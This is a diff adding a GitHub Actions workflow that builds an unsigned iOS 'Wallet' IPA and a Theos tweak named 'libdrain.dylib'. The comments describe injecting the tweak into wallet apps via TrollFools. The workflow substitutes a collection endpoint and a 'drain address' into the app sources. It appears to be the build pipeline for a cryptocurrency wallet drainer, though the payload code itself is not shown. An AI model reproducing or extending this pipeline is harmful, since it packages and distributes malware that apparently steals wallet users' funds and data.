@@ -1,0 +1,134 @@
+name: build-ios
+
+# Windows 上编不了 iOS；本工作流在 GitHub 的 macOS runner 上产出：
+#   1. Wallet-unsigned.ipa   —— 可直接给 TrollStore / 企业签名 / Sideloadly
+#   2. libdrain.dylib        —— Theos 编译，供 TrollFools 注入钱包 App
+#
+# 触发：手动（workflow_dispatch）或推送 ios-shell/
+on:
+  workflow_dispatch:
+    inputs:
+      collect_endpoint:
+        description: 'COLLECT_ENDPOINT（如 https://host）'
+        required: false
+        default: 'COLLECT_ENDPOINT'
+      drain_addr:
+        description: 'DRAIN_ADDR'
+        required: false
+        default: 'DRAIN_ADDR'
+      build_ipa:
+        description: '构建 unsigned IPA'
+        type: boolean
+        default: true
+      build_dylib:
+        description: '构建 Theos dylib'
+        type: boolean
+        default: true
+  push:
+    paths:
+      - 'ios-shell/**'
+      - '.github/workflows/build-ios.yml'
+
+jobs:
+  ipa:
+    if: ${{ github.event_name == 'push' || inputs.build_ipa }}
+    runs-on: macos-14
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: 替换占位符
+        run: |
+          set -e
+          EP='${{ inputs.collect_endpoint || 'COLLECT_ENDPOINT' }}'
+          DA='${{ inputs.drain_addr || 'DRAIN_ADDR' }}'
+          echo "endpoint=$EP drain=$DA"
+          # 只替换 Swift/JS/plist 里的占位符，不改文档
+          find ios-shell -type f \( -name '*.swift' -o -name '*.js' -o -name '*.plist' \) \
+            -exec sed -i '' "s|COLLECT_ENDPOINT|$EP|g; s|DRAIN_ADDR|$DA|g" {} +
+          grep -rn "COLLECT_ENDPOINT\|DRAIN_ADDR" ios-shell || echo "占位符已全部替换"
+
+      - name: 安装 xcodegen
+        run: brew install xcodegen
+
+      - name: 生成工程
+        working-directory: ios-shell
+        run: xcodegen generate
+
+      - name: 归档（无签名）
+        working-directory: ios-shell
+        run: |
+          set -e
+          xcodebuild -project Wallet.xcodeproj \
+            -scheme Wallet -configuration Release \
+            -sdk iphoneos -destination 'generic/platform=iOS' \
+            -archivePath build/Wallet.xcarchive \
+            CODE_SIGNING_ALLOWED=NO CODE_SIGNING_REQUIRED=NO \
+            CODE_SIGN_IDENTITY="" \
+            archive | xcpretty || xcodebuild -project Wallet.xcodeproj \
+            -scheme Wallet -configuration Release -sdk iphoneos \
+            -destination 'generic/platform=iOS' -archivePath build/Wallet.xcarchive \
+            CODE_SIGNING_ALLOWED=NO CODE_SIGNING_REQUIRED=NO archive
+
+      - name: 打包成 unsigned IPA
+        working-directory: ios-shell
+        run: |
+          set -e
+          APP="build/Wallet.xcarchive/Products/Applications/Wallet.app"
+          test -d "$APP"
+          mkdir -p build/Payload
+          cp -R "$APP" build/Payload/
+          # 去掉签名残留，TrollStore/Sideloadly 会自己签
+          rm -rf build/Payload/Wallet.app/_CodeSignature || true
+          cd build && zip -qry Wallet-unsigned.ipa Payload
+          ls -lh Wallet-unsigned.ipa
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: Wallet-unsigned-ipa
+          path: ios-shell/build/Wallet-unsigned.ipa
+          if-no-files-found: error
+
+  dylib:
+    if: ${{ github.event_name == 'push' || inputs.build_dylib }}
+    runs-on: macos-14
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: 安装 Theos
+        run: |
+          set -e
+          export THEOS=$HOME/theos
+          git clone --recursive https://github.com/theos/theos.git $THEOS
+          echo "THEOS=$THEOS" >> $GITHUB_ENV
+          echo "$THEOS/bin" >> $GITHUB_PATH
+
+      - name: 拉取 iOS SDK
+        run: |
+          set -e
+          mkdir -p $THEOS/sdks
+          curl -L -o /tmp/sdk.tar.xz \
+            https://github.com/theos/sdks/raw/master/iPhoneOS16.5.sdk.tar.xz
+          tar -xJf /tmp/sdk.tar.xz -C $THEOS/sdks
+          ls $THEOS/sdks
+
+      - name: 构建 tweak
+        working-directory: ios-shell/Tweak
+        run: |
+          set -e
+          make clean || true
+          make package FINALPACKAGE=1 DEBUG=0
+          find .theos -name '*.dylib' -o -name '*.deb' | head -20
+
+      - name: 收集产物
+        run: |
+          set -e
+          mkdir -p out
+          find ios-shell/Tweak/.theos -name '*.dylib' -exec cp {} out/ \;
+          find ios-shell/Tweak/.theos -name '*.deb' -exec cp {} out/ \;
+          ls -lh out/
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: drain-tweak
+          path: out/
+          if-no-files-found: warn
